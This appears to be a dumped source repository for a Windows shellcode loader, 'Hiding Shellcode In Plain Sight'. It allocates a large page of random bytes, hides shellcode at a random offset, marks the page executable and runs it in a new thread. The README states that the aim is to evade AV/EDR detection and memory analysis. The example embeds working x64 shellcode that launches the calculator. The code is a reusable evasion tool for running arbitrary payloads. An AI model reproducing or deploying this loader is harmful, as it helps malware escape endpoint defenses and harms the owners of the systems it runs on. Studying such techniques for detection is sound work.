Project Path: arc_gmh5225_shellcode-plain-sight_vfrs_b76

Source Tree:

```txt
arc_gmh5225_shellcode-plain-sight_vfrs_b76
├── LICENSE
├── README.md
├── example_pop_calc.c
├── page.c
└── page.h

```

`LICENSE`:

```
MIT License

Copyright (c) 2023 Lloyd

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# Hiding Shellcode In Plain Sight
This technique is very simple, a RW memory region 2048 the size of the shellcode is allocated. This region is then filled with randomized data data (`RtlGenRandom`), the shellcode is then placed **randomly** somewhere within this massive region each time. This makes it hard for an AV/EDR solution, or an analyst, to simply see where the shellcode is in-memory. To summarize:
1. Allocate a large `PAGE_READWRITE` region, `2048 * size` of the target shellcode, and align to `0x1000`
2. Fill this allocated region with random data
3. Write the shellcode to a random location within this region, save position
4. Change the page permissions to `PAGE_EXECUTE`
5. Execute the shellcode (page + position)
6. Zero the memory where the entire large region is to ensure the data does not persist after being freed, using the `RtlZeroMemory` macro
7. Free the region of memory

# Example
As can be seen below, the entropy does not change much at all. It is not obvious, from e.g. a memory dump, where the shellcode is actually situated. This can be seen inside `example_pop_calc.c`

![Memory dump entropy](https://i.imgur.com/96ixWdw.png)

You can execute the shellcode however you wish. This code is simply to demonstrate the simple technique. This technique was originally detailed in Avast's Raspberry Robin writeup [here](https://decoded.avast.io/janvojtesek/raspberry-robins-roshtyak-a-little-lesson-in-trickery/).

```

`example_pop_calc.c`:

```c
#include <stdio.h>
#include <stdlib.h>

#include "page.h"

int main(
	int argc, 
	char** argv
)
{
	// Basic, execute calc code
	BYTE bExecCalcShellcode[] = { 
		0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18, 0x48, 0x8b, 0x5b, 0x20, 0x48, 
		0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49, 0x89, 0xd8, 0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31,
		0xc9, 0x66, 0x81, 0xc1, 0xff, 0x88, 0x48, 0xc1, 0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x4d, 0x31, 0xd2, 0x44,
		0x8b, 0x52, 0x1c, 0x4d, 0x01, 0xc2, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01, 0xc3, 0x4d, 0x31, 0xe4, 0x44,
		0x8b, 0x62, 0x24, 0x4d, 0x01, 0xc4, 0xeb, 0x32, 0x5b, 0x59, 0x48, 0x31, 0xc0, 0x48, 0x89, 0xe2, 0x51, 0x48, 0x8b, 0x0c,
		0x24, 0x48, 0x31, 0xff, 0x41, 0x8b, 0x3c, 0x83, 0x4c, 0x01, 0xc7, 0x48, 0x89, 0xd6, 0xf3, 0xa6, 0x74, 0x05, 0x48, 0xff,
		0xc0, 0xeb, 0xe6, 0x59, 0x66, 0x41, 0x8b, 0x04, 0x44, 0x41, 0x8b, 0x04, 0x82, 0x4c, 0x01, 0xc0, 0x53, 0xc3, 0x48, 0x31,
		0xc9, 0x80, 0xc1, 0x07, 0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91, 0xba, 0x87, 0x9a, 0x9c, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe8,
		0x08, 0x50, 0x51, 0xe8, 0xb0, 0xff, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48, 0x31, 0xc9, 0x48, 0xf7, 0xe1, 0x50, 0x48, 0xb8,
		0x9c, 0x9e, 0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50, 0x48, 0x89, 0xe1, 0x48, 0xff, 0xc2, 0x48, 0x83,
		0xec, 0x20, 0x41, 0xff, 0xd6
	};

	srand(time(NULL));

	PPAGE_SHELLCODE_CONTEXT ctx = allocate_large_page(NULL, sizeof(bExecCalcShellcode));
	if (ctx == NULL)
	{
		return 0;
	}

	place_shellcode_rand(ctx, bExecCalcShellcode, sizeof(bExecCalcShellcode));

#if _DEBUG
	dump_ctx_struct(ctx);
#endif

	execute_shellcode(ctx);
	destroy_context(ctx);

	return 1;
}
```

`page.c`:

```c
#include "page.h"
#include <ntsecapi.h>

#ifdef _DEBUG
#include <stdio.h>

VOID
dump_ctx_struct(
	PPAGE_SHELLCODE_CONTEXT pCtx
)
{
	printf("PPAGE_SHELLCODE_CONTEXT Dump ->\n"
		"\t\tKey = 0x%x\n"
		"\t\tLocation = 0x%x\n"
		"\t\tSize = 0x%zx\n"
		"\t\tPage = 0x%llx\n",
		pCtx->u8Key,
		pCtx->dwLocation,
		pCtx->uSize,
		pCtx->lpPage
	);
}
#endif

PPAGE_SHELLCODE_CONTEXT
allocate_large_page(
	HANDLE hTarget,
	DWORD cbPageSize
)
{
	PPAGE_SHELLCODE_CONTEXT pCtx = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PAGE_SHELLCODE_CONTEXT));
	if (pCtx == NULL)
		return NULL;

	pCtx->uSize = ALIGN_PAGE(cbPageSize * FACTOR);
	if ((pCtx->lpPage = VirtualAlloc(hTarget, pCtx->uSize, MEM_COMMIT, PAGE_READWRITE)) != NULL)
	{
		RtlGenRandom(pCtx->lpPage, pCtx->uSize);
		pCtx->dwLocation = RANDOM_NUMB(0, pCtx->uSize);
	}

	return pCtx;
}

VOID
destroy_context(
	PPAGE_SHELLCODE_CONTEXT pCtx
)
{
	if (pCtx != NULL)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, (LPVOID)pCtx);
}

VOID
encode_shellcode_content(
	PPAGE_SHELLCODE_CONTEXT pCtx,
	PBYTE pbBuffer,
	SIZE_T cbBuffer,
	UINT8 u8Key
)
{
	if (u8Key == 0)
		pCtx->u8Key = (RANDOM_NUMB(0, 0xFF) & 0xFF);

	for (SIZE_T i = 0; i < cbBuffer; i++)
	{
		pbBuffer[i] ^= pCtx->u8Key;
	}
}

VOID
place_shellcode_rand(
	PPAGE_SHELLCODE_CONTEXT pCtx,
	PBYTE pbBuffer,
	SIZE_T cbBuffer
)
{
	RtlCopyMemory((PBYTE)pCtx->lpPage + pCtx->dwLocation, pbBuffer, cbBuffer);
}

VOID
execute_shellcode(
	PPAGE_SHELLCODE_CONTEXT pCtx
)
{
	DWORD dwOldProtect;
	if (VirtualProtect(pCtx->lpPage, pCtx->uSize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
	{
		PBYTE pbLocation = (PBYTE)pCtx->lpPage + pCtx->dwLocation;

		HANDLE hThread;
		if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pbLocation, 0, 0, 0)))
		{
			WaitForSingleObject(hThread, INFINITE);
		}
	}

	RtlSecureZeroMemory(pCtx->lpPage, pCtx->uSize);
	VirtualFree(pCtx->lpPage, 0, MEM_RELEASE);
}

```

`page.h`:

```h
#ifndef PAGE_H
#define PAGE_H

#include <Windows.h>

#define RANDOM_NUMB(min, max) (rand() % (max + 1 - min) + min)
#define ALIGN_PAGE(n) ((n + 0x1000) & ~(0x1000))

#define FACTOR 2048

typedef struct _PAGE_SHELLCODE_CONTEXT {
	UINT8 u8Key;
	DWORD dwLocation;
	SIZE_T uSize;
	LPVOID lpPage;
} PAGE_SHELLCODE_CONTEXT, *PPAGE_SHELLCODE_CONTEXT;

#ifdef _DEBUG
VOID 
dump_ctx_struct(
	PPAGE_SHELLCODE_CONTEXT pCtx
);
#endif

PPAGE_SHELLCODE_CONTEXT 
allocate_large_page(
	HANDLE hTarget,
	DWORD szPageSize
);

VOID 
place_shellcode_rand(
	PPAGE_SHELLCODE_CONTEXT ctx,
	PBYTE pbBuffer,
	SIZE_T szBufferLen
);

VOID 
execute_shellcode(
	PPAGE_SHELLCODE_CONTEXT psCtx
);

VOID 
destroy_context(
	PPAGE_SHELLCODE_CONTEXT ctx
);

#endif
```